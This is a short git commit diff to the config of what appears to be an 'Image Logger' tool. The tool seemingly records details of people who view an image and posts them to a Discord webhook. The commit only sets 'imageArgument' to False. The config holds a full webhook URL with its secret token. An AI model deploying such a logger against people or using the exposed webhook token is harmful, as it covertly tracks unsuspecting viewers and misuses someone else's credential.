2ba9fcdda631a225b4f52b12d69a09a6b326829f
xTwiss <stefangtr10@gmail.com>
2025-03-19 11:09:20 +0100

    png.py aktualisieren

--- api/png.py
+++ api/png.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1351629998846509149/jiOEclb7_RJFIZzFd60FaedplGbFArkfLoNxE7zXuzbtECW0XOIwRdmXMHARKtMiMrFp",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
